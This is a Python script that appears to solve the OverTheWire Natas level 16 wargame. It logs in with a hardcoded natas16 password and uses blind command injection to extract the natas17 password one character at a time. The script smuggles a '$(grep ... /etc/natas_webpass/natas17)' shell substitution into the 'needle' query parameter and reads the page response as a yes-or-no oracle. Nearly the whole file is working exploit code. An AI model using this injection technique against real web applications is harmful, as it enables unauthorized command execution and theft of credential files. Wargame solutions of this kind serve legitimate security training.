#! /usr/bin/env python3
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
filteredchars = ''
passwd = ''
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

i = 0
while i < len(allchars):
    char = allchars[i]
    i += 1
    try:
        req = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ' +
                           char + ' /etc/natas_webpass/natas17)', auth=auth)
    except (requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError):
        print('Upper data Gets Network Error2')
        i -= 1
        continue

    if 'doomed' not in req.text:
        filteredchars += char
        print(filteredchars)

print('\033[1m\033[94m' + 'FILTERED   >>> ' + filteredchars)


# filteredchars = 'bcdghkmnqrswAGHNPQSW357890'
for _ in range(32):
    i = 0
    while i < len(filteredchars):
        char = filteredchars[i]
        i += 1
        try:
            req = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ^' +
                               passwd + char + ' /etc/natas_webpass/natas17)', auth=auth, timeout=3)
        except (requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError):
            print('Upper data Gets Network Error2')
            i -= 1
            continue

        if 'doomed' not in req.text:
            passwd += char
            print(passwd)
            break

print('\033[1m\033[92m' + 'The password for natas17: ' + passwd)
